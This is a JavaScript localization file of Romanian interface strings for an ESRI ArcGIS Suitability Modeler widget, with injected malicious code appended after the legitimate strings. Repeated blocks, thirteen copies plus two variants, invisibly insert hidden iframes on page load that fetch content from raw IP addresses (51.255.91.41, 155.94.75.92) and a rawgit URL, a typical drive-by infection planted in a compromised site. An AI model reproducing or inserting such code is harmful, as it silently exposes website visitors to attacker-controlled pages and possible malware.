// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Model de adecvare",general:{clear:"Golire",cancel:"Anulare",save:"Executare",saveAs:"Export"},saveModel:{save:"Export",title:"Titlu: ",summary:"Rezumat: ",description:"Descriere: ",tags:"Etichete: ",folder:"Director: ",homeFolderPattern:"{username} (Pornire)",failed:"Export e\u015fuat."},util:{colorRamp:{1:"Extrem de redus",2:"Foarte redus",3:"Redus",4:"Redus mediu",5:"Medie",6:"Ridicat mediu",7:"Ridicat",8:"Foarte ridicat",9:"Extrem de ridicat",
low:"Redus",high:"Ridicat",tipPattern:"{label} ({value})",flipCaption:"Inversare"}},wro:{caption:"Model de adecvare",browsePrompt:"Serviciu suprapus ponderat",selectLayersCaption:"Selectare straturi tematice",selectLayers:"Straturi tematice",designModelCaption:"Model design",designModel:"Model design",transparency:"Transparen\u0163\u0103",visible:"Vizibil",total:"Total",unableToLoad:"Imposibil de \u00eenc\u0103rcat modelul.",projectNotOpen:"Un proiect nu este deschis.",readMore:"Citi\u0163i mai mult",
validation:{validating:"\u00cen curs de validare...",invalidItemCaption:"Avertisment serviciu suprapus ponderat",notAnImageService:"Acest element nu este un serviciu de imagini.",notAWroService:"Acest element nu este un serviciu suprapus ponderat.",undefinedUrl:"URL-ul acestui element nu este definit.",inaccessible:"Serviciul este inaccesibil.",generalError:"Nu se poate deschide elementul.",missingFieldPattern:"{field} este un c\u00e2mp obligatoriu",notAllowRasterFunction:"allowRasterFunction trebuie setat la valoarea true",
notNearestResampling:"defaultResamplingMethod trebuie s\u0103 fie Cel mai apropiat",notIsWeightedOverlayProp:"Proprietatea cheie IsWeightedOverlay trebuie setat\u0103 la valoarea true",invalidLink:"Adresa URL nu este valid\u0103. Nu s-a reu\u015fit deschiderea site-ului pentru stratul tematic selectat.",unexpectedError:"A survenit o stare nea\u015fteptat\u0103.",rangeMessage:"Valoarea trebuie s\u0103 fie \u00eentre ${0} \u015fi ${1}",rangeMessage100:"Valoarea trebuie s\u0103 fie \u00eentre 0 \u015fi 100",
maxLayers:"Maximum ${0} straturi tematice permise de serviciu, trebuie ca mai \u00eent\u00e2i s\u0103 elimina\u0163i un strat tematic \u00eenainte de a ad\u0103uga unul nou.",notFound:"Stratul tematic ${0} nu a fost g\u0103sit \u00een serviciul suprapus ponderat",wroServiceNotDefined:"Nu a fost definit niciun serviciu suprapus ponderat pentru model.",overlayLayerOutputInvalid:"Valoarea de ie\u015fire [${1}] a intervalelor stratului tematic suprapus [${0}] lipse\u015fte sau nu este valid\u0103",overlayLayerInputInvalid:"Valoarea minim\u0103/maxim\u0103 de intrare [${1}] a intervalelor stratului tematic suprapus [${0}] lipse\u015fte sau nu este valid\u0103",
overlayLayerRangesMissing:"Stratul tematic suprapus [${0}] nu are intervalele de remapare",overlayLayerWeight:"Valorile ponderate ale stratului tematic suprapus au o valoare total\u0103 de p\u00e2n\u0103 la 100",overlayLayerRequired:"Este necesar cel pu\u0163in un strat tematic suprapus",overlayLayerNotDefined:"Straturile tematice suprapuse nu sunt definite",requiresColormap:"Func\u0163ia raster necesit\u0103 o hart\u0103 color, \u00eens\u0103 modelul nu are o defini\u0163ie valid\u0103 a h\u0103r\u0163ii color",
createModelError:"Eroare la crearea modelului",invalidModel:"Modelul nu este valid",imageServiceNotDefined:"Stratul tematic de imagini nu este definit",imageLayerNotDefined:"Stratul tematic de imagini nu este definit",histogramNotDefined:"Nu a fost definit\u0103 nicio func\u0163ie de histogram\u0103 ponderat\u0103 suprapus\u0103."},colorRampLabel:{"Green Yellow Red":"Verde Galben Ro\u015fu","Red Yellow Green":"Ro\u015fu Galben Verde","Yellow to Dark Red":"De la galben la ro\u015fu \u00eenchis","Dark Red to Yellow":"De la ro\u015fu \u00eenchis la galben",
"Light Gray to Dark Gray":"De la gri deschis la gri \u00eenchis","Dark Gray to Light Gray":"De la gri \u00eenchis la gri deschis","Light Brown to Dark Brown":"De la maro deschis la maro \u00eenchis","Dark Brown to Light Brown":"De la maro \u00eenchis la maro deschis","Full Spectrum - Bright Red to Blue":"Spectru complet - de la ro\u015fu deschis la albastru","Full Spectrum - Bright Blue to Red":"Spectru complet - de la albastru deschis la ro\u015fu","Partial Spectrum - Yellow to Blue":"Spectru par\u0163ial - de la galben la albastru",
"Partial Spectrum - Blue to Yellow":"Spectru par\u0163ial - de la albastru la galben","Yellow-Green to Dark Blue":"De la galben-verde la albastru \u00eenchis","Dark Blue to Yellow-Green":"De la albastru \u00eenchis la galben-verde","Cold to Hot Diverging":"Divergen\u0163\u0103 de la rece la cald","Hot to Cold Diverging":"Divergen\u0163\u0103 de la cald la rece","Surface - Low to High":"Suprafa\u0163\u0103 - de la redus la ridicat","Surface - High to Low":"Suprafa\u0163\u0103 - de la ridicat la redus"}},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});